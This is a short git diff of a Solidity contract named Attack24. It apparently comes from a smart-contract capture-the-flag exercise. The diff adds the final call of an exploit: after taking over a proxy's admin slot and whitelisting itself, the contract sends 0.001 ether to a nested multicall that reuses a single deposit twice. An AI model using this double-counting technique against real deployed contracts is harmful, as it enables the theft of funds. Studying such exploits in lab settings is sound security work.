@@ -19,8 +19,6 @@ contract Attack24 {
         proxy.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
 
-        // build: deposit + multicall(deposit)
-
         // multicall
         // 1. deposit
         // 2. multicall
@@ -32,6 +30,7 @@ contract Attack24 {
         bytes[] memory data = new bytes[](2);
         data[0] = deposit_data[0];
         data[1] = abi.encodeWithSelector(target.multicall.selector, deposit_data);
+        target.multicall{value: 0.001 ether}(data);
 
      }
 }
